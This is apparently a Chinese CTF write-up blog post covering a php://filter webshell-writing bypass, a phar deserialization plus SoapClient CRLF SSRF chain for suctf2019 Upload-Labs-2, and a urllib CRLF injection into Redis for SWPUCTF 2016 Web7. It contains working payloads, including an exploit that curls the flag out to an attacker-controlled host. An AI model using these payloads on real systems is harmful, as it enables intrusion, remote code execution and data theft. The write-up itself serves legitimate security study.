<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?content=php:<span class="regexp">//</span>filter<span class="regexp">/write=string.%2572ot13|&lt;?cuc @riny($_TRG[_]);?&gt;/</span>resource=npfs.php </span><br><span class="line"></span><br><span class="line">?content=npfs.php&amp;_=system(<span class="string">&quot;ls /&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>注意每利用一次文件，就要重新包含一次</span><br></pre></td></tr></table></figure>


<p>方法二：过滤器构造绕过</p>
<p>题目中过滤的过滤器有👇</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/iconv|<span class="type">UCS</span>|<span class="type">UTF</span>|<span class="type">rot</span>|<span class="type">quoted</span>|<span class="type">base64</span>/</span><br></pre></td></tr></table></figure>
<p><code>php:filter</code>支持使用多个过滤器，参考官方文档 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.php">可用过滤器列表</a>，还留下了<strong>字符串过滤器中的部分</strong>和<strong>压缩过滤器</strong>以及<strong>加密过滤器</strong>，这里考虑用<code>zlib</code>的<code>zlib.deflate</code>和<code>zlib.inflate</code>，组合使用压缩后再解压后内容肯定不变，不过我们可以在中间遍历一下剩下的几个过滤器，看看中间进行什么操作会影响后续inflate的内容，简单遍历一下可以发现中间插入string.tolower转后会把空格和exit处理了就可以绕过exit👇</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?content=php:<span class="comment">//filter/zlib.deflate|string.tolower|zlib.inflate|<span class="meta">?&gt;</span><span class="meta">&lt;?php</span>%0deval($_GET[1]);<span class="meta">?&gt;</span>/resource=npfs.php</span></span><br><span class="line"></span><br><span class="line">?content=npfs.php&amp;<span class="number">1</span>=system(<span class="string">&#x27;ls /&#x27;</span>);</span><br></pre></td></tr></table></figure>




<h2 id="suctf2019-Upload-Labs-2"><a href="#suctf2019-Upload-Labs-2" class="headerlink" title="suctf2019-Upload-Labs-2"></a>suctf2019-Upload-Labs-2</h2><p>首先是一个文件上传，有三点限制</p>
<ul>
<li>后缀只能是gif,jpeg,jpg,png</li>
<li>检查了MIME类型，抓包改下即可</li>
<li>文件内容不能出现&lt;?，但是限制的很不严谨</li>
</ul>
<p>index.php</p>
<p><img src="https://img.npfs06.top/20210327160926.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>class.php</p>
<p><img src="https://img.npfs06.top/20210327160618.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>然后在func,php有一个查看上传文件类型的功能</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">func.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;submit&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;url&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Go away!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$file_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">new</span> File(<span class="variable">$file_path</span>);</span><br><span class="line">        <span class="variable">$file</span>-&gt;getMIME();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Your file type is &#x27;<span class="subst">$file</span>&#x27; &lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//主要就是限制了各种协议，然后实例化了File类，调用了getMIME()方法</span></span><br></pre></td></tr></table></figure>
<p>跟进到File类和getMIME()方法看看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$type</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&quot;Check&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file_name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name = <span class="variable">$file_name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$class</span> = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable">$class</span>-&gt;newInstanceArgs(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        <span class="variable">$a</span>-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getMIME</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$finfo</span> = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;type = finfo_file(<span class="variable">$finfo</span>, <span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        finfo_close(<span class="variable">$finfo</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>finfo_file,看一看这个函数的c源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> FILEINFO_MODE_FILE:</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">/* determine if the file is a local file or remote URL */</span></span><br><span class="line">			<span class="keyword">const</span> <span class="keyword">char</span> *tmp2;</span><br><span class="line">			php_stream_wrapper *wrap;</span><br><span class="line">			php_stream_statbuf ssb;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (buffer == <span class="literal">NULL</span> || !*buffer) &#123;</span><br><span class="line">				php_error_docref(<span class="literal">NULL</span>, E_WARNING, <span class="string">&quot;Empty filename or path&quot;</span>);</span><br><span class="line">				RETVAL_FALSE;</span><br><span class="line">				<span class="keyword">goto</span> clean;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (CHECK_NULL_PATH(buffer, buffer_len)) &#123;</span><br><span class="line">				php_error_docref(<span class="literal">NULL</span>, E_WARNING, <span class="string">&quot;Invalid path&quot;</span>);</span><br><span class="line">				RETVAL_FALSE;</span><br><span class="line">				<span class="keyword">goto</span> clean;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			wrap = php_stream_locate_url_wrapper(buffer, &amp;tmp2, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<p>其中调用了php_stream_locate_url_wrapper这个函数<br>在<a target="_blank" rel="noopener" href="https://blog.zsxsoft.com/post/38">https://blog.zsxsoft.com/post/38</a> 中讲了，使用了php_stream_locate_url_wrapper的php函数，都会存在phar反序列化的问题<br>phar反序列化如何触发一个ssrf呢，这里可以利用到SoapClient的CRLF注入漏洞</p>
<p>而后就是 admin.php 中令人异常疑惑的四段代码了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$reflect</span> = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;clazz);</span><br><span class="line"><span class="keyword">$this</span>-&gt;instance = <span class="variable">$reflect</span>-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line"><span class="variable">$reflectionMethod</span> = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func1);</span><br><span class="line"><span class="variable">$reflectionMethod</span>-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg1);</span><br><span class="line"></span><br><span class="line"><span class="variable">$reflectionMethod</span> = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func2);</span><br><span class="line"><span class="variable">$reflectionMethod</span>-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg2);</span><br><span class="line"></span><br><span class="line"><span class="variable">$reflectionMethod</span> = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func3);</span><br><span class="line"><span class="variable">$reflectionMethod</span>-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg3);</span><br></pre></td></tr></table></figure>
<p>ReflectionClass，是一个反射类，能将参数实例化</p>
<p>而ReflectionClass::newInstanceArgs相当于用来赋值</p>
<p><img src="https://img.npfs06.top/20210327221043.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>有什么用呢？用<code>__wakeup</code>，需要想办法去触发反序列化。然而这四段代码其实正好对应了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$m</span> = <span class="keyword">new</span> mysqli();</span><br><span class="line"><span class="variable">$m</span>-&gt;init();</span><br><span class="line"><span class="variable">$m</span>-&gt;real_connect(<span class="string">&#x27;ip&#x27;</span>,<span class="string">&#x27;select 1&#x27;</span>,<span class="string">&#x27;select 1&#x27;</span>,<span class="string">&#x27;select 1&#x27;</span>,<span class="number">3306</span>);</span><br><span class="line"><span class="variable">$m</span>-&gt;query(<span class="string">&#x27;select 1;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>其实也就是 @LoRexxar’ 在 Tsec 上进行的分享 <a target="_blank" rel="noopener" href="https://paper.seebug.org/998/">Comprehensive analysis of the mysql client attack chain</a> 的内容了，@zsx 文章中指出</p>
<p><img src="https://img.npfs06.top/20210327221533.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>既然可以这么触发，那么 Rogue Mysql 的攻击当然适用于 phar 反序列化了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$reflect</span> = <span class="keyword">new</span> ReflectionClass(<span class="string">&#x27;Mysqli&#x27;</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="variable">$reflect</span>-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line"><span class="variable">$reflectionMethod</span> = <span class="keyword">new</span> ReflectionMethod(<span class="string">&#x27;Mysqli&#x27;</span>, <span class="string">&#x27;init&#x27;</span>);</span><br><span class="line"><span class="variable">$reflectionMethod</span>-&gt;invoke(<span class="variable">$sql</span>, <span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$reflectionMethod</span> = <span class="keyword">new</span> ReflectionMethod(<span class="string">&#x27;Mysqli&#x27;</span>, <span class="string">&#x27;real_connect&#x27;</span>);</span><br><span class="line"><span class="variable">$reflectionMethod</span>-&gt;invoke(<span class="variable">$sql</span>, <span class="string">&#x27;ip&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;3306&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$reflectionMethod</span> = <span class="keyword">new</span> ReflectionMethod(<span class="string">&#x27;Mysqli&#x27;</span>, <span class="string">&#x27;query&#x27;</span>);</span><br><span class="line"><span class="variable">$reflectionMethod</span>-&gt;invoke(<span class="variable">$sql</span>, <span class="string">&#x27;select 1&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>先给exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func=<span class="string">&#x27;SoapClient&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$target</span> = <span class="string">&quot;http://127.0.0.1/admin.php&quot;</span>;</span><br><span class="line">        <span class="variable">$post_string</span> = <span class="string">&#x27;admin=&amp;cmd=curl http://xxx.xxx.xxx.xxx:2333/?`/readflag`&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3=&#x27;</span>. <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">        <span class="variable">$headers</span> = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name=[</span><br><span class="line">            <span class="literal">null</span>,</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">                <span class="string">&#x27;user_agent&#x27;</span>=&gt;str_replace(<span class="string">&#x27;^^&#x27;</span>, <span class="string">&quot;\r\n&quot;</span>,<span class="string">&#x27;w4nder^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;Content-Length: &#x27;</span>. (<span class="keyword">string</span>)strlen(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>.<span class="string">&#x27;^^&#x27;</span>)</span><br><span class="line">                ,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> File();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line">@unlink(<span class="string">&quot;1.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;1.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;script language=&#x27;php&#x27;&gt; __HALT_COMPILER(); &lt;/script&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">&#x27;1.phar&#x27;</span>,<span class="string">&#x27;1.jpg&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>生成phar上传，然后来到func.php，可以用php://filter/resource=phar://绕过过滤，输入： </p>
<blockquote>
<p>php://filter/resource=phar://upload/xxxxxxxxxxx/xxxxxxxxxxx.jpg</p>
</blockquote>
<p>同时开启监听，即可得到flag</p>
<p>总的来说就是，想要读到 flag 就必须反序列化 Ad 类，可以利用的反序列化只有 phar。而 Ad 类是实现 MySQL 连接的地方，这就可以使用 MySQL 客户端攻击，让 admin.php 连接到一个伪造的 MySQL 服务端，然后在这个伪造的服务端用 phar:// 读取 phar 文件，从而触发 Ad() 类的反序列化。</p>
<p>要想让 admin.php 连接伪造的 MySQL 服务端，就要让 REMOTE_ADDR 为 127.0.0.1，即本地访问，而在 File 类中的 __wakeup() 恰好可以提供 Soap Client 反序列化实现 SSRF，接下来就是如何让 File() 类反序列化。</p>
<p>可以看到 File() 类的 getMIME() 函数使用了 finfo_file() 函数，这个函数可以触发 phar 反序列化，但是在 fuc.php <code>不能传 phar:// 开头的字符串</code>，这里就可以使用 <code>php://filter/resource=......</code> 进行绕过，而对于文件内容不能有 <code>&lt;?</code> 则可以使用 <code>&lt;script language=&#39;php&#39;&gt;__HALT_COMPILER();&lt;/script&gt;</code> 绕过</p>
<p>整体就是通过 File 触发 Soap 访问 admin.php，接着触发 Mysql Client Attack，再触发 phar 即可</p>
<p>参考：<a target="_blank" rel="noopener" href="https://v2as.com/article/dc469a53-27f0-4695-bd51-677f690190d3">https://v2as.com/article/dc469a53-27f0-4695-bd51-677f690190d3</a></p>
<h2 id="SWPUCTF-2016-Web7"><a href="#SWPUCTF-2016-Web7" class="headerlink" title="[SWPUCTF 2016]Web7"></a>[SWPUCTF 2016]Web7</h2><p>源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"><span class="keyword">import</span> cherrypy</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web7</span>:</span></span><br><span class="line"><span class="meta">    @cherrypy.expose</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt; window.location.href=&#x27;/input&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line"><span class="meta">    @cherrypy.expose</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">input</span>(<span class="params">self,url=<span class="string">&quot;&quot;</span>,submit=<span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">        file=<span class="built_in">open</span>(<span class="string">&quot;index.html&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">        reheaders=<span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> cherrypy.request.method==<span class="string">&quot;GET&quot;</span>:</span><br><span class="line">            reheaders=<span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            url=cherrypy.request.params[<span class="string">&quot;url&quot;</span>]</span><br><span class="line">            submit=cherrypy.request.params[<span class="string">&quot;submit&quot;</span>]</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> urllib2.urlopen(url).info().headers:</span><br><span class="line">                    reheaders=reheaders+x+<span class="string">&quot;&lt;br&gt;&quot;</span></span><br><span class="line">            <span class="keyword">except</span> Exception,e:</span><br><span class="line">                reheaders=<span class="string">&quot;错误&quot;</span>+<span class="built_in">str</span>(e)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> urllib2.urlopen(url).info().headers:</span><br><span class="line">                reheaders=reheaders+x+<span class="string">&quot;&lt;br&gt;&quot;</span></span><br><span class="line">        file=file.replace(<span class="string">&quot;&lt;?response?&gt;&quot;</span>,reheaders)</span><br><span class="line">        <span class="keyword">return</span> file</span><br><span class="line"><span class="meta">    @cherrypy.expose</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">self,password=<span class="string">&quot;&quot;</span>,submit=<span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">        pool = redis.ConnectionPool(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">6379</span>)</span><br><span class="line">        r = redis.Redis(connection_pool=pool)</span><br><span class="line">        re=<span class="string">&quot;&quot;</span></span><br><span class="line">        file=<span class="built_in">open</span>(<span class="string">&quot;login.html&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">        <span class="keyword">if</span> cherrypy.request.method==<span class="string">&quot;GET&quot;</span>:</span><br><span class="line">            re=<span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            password=cherrypy.request.params[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">            submit=cherrypy.request.params[<span class="string">&quot;submit&quot;</span>]</span><br><span class="line">            <span class="keyword">if</span> r.get(<span class="string">&quot;admin&quot;</span>)==password:</span><br><span class="line">                re=<span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&#x27;r&#x27;</span>).readline()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                re=<span class="string">&quot;Can&#x27;t find admin:&quot;</span>+password+<span class="string">&quot;,fast fast fast.....&quot;</span></span><br><span class="line">        file=file.replace(<span class="string">&quot;&lt;?response?&gt;&quot;</span>,re)</span><br><span class="line">        <span class="keyword">return</span> file</span><br><span class="line">cherrypy.config.update(&#123;<span class="string">&#x27;server.socket_host&#x27;</span>: <span class="string">&#x27;0.0.0.0&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;server.socket_port&#x27;</span>: <span class="number">8080</span>,</span><br><span class="line">                       &#125;)</span><br><span class="line">cherrypy.quickstart(web7(),<span class="string">&#x27;/&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>两个页面，一个<code>/input</code>允许我们输入URL，然后会用urllib2.urlopen()访问我们的URL。还有一个<code>/login</code>，要求我们输入管理员的密码,如果与Redis数据库中的密码相同，我们就可以拿到Flag</p>
<p><img src="https://img.npfs06.top/20210328181734.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="http://img.npfs06.top/20210328181758.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><a href="https://bugs.python.org/issue30458" target="_blank">CVE-2019-9947</a></p>
<p><img src="https://img.npfs06.top/20210328182806.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>简单来说，就是urlopen()处理URL的时候没有考虑换行符，导致我们可以在正常的HTTP头中插入任意内容</p>
<p>也就是说，我们就可以通过%0d%0a去构造一个新的HTTP请求。</p>
<p>思路：向Redis写数据，改掉admin的密码。Redis改数据用set指令。然后换行用%0d%0a。所以，Payload：<code>http://127.0.0.1%0d%0aset%20admin%20admin%0d%0asave%0d%0a:6379/foo</code> </p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">GET</span> / HTTP/<span class="number">1.1</span></span><br><span class="line">Accept-<span class="keyword">Encoding</span>: <span class="keyword">identity</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">set</span> <span class="keyword">admin</span> <span class="keyword">admin</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="keyword">Connection</span>: <span class="keyword">close</span></span><br><span class="line"><span class="keyword">User</span>-Agent: Python-urllib/<span class="number">2.7</span></span><br></pre></td></tr></table></figure>


<p>然后我们登录/login，输入admin就可以了。不过动作要快，因为admin密码会定时修改。</p>
<h2 id="Windows-HITCON-2019-Buggy-Net"><a href="#Windows-HITCON-2019-Buggy-Net" class="headerlink" title="[Windows][HITCON 2019]Buggy_Net"></a>[Windows][HITCON 2019]Buggy_Net</h2><p>hint:flag在c:/FLAG.txt</p>
<p>给了源码，主要部分如下</p>
